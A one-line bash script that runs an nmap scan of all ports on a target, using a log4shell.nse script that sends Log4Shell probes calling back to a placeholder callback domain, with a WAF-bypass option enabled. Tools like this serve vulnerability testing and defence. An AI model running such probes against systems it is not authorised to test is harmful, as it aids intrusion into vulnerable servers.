#!/bin/bash
mkdir -p scans/$1; nmap -d -p- -T4 -v -oA scans/$1/ --script log4shell.nse --script-args 'log4shell.callback-server=.L4J.<your-domain>,log4shell.waf-bypass=true,test-method=all' $1
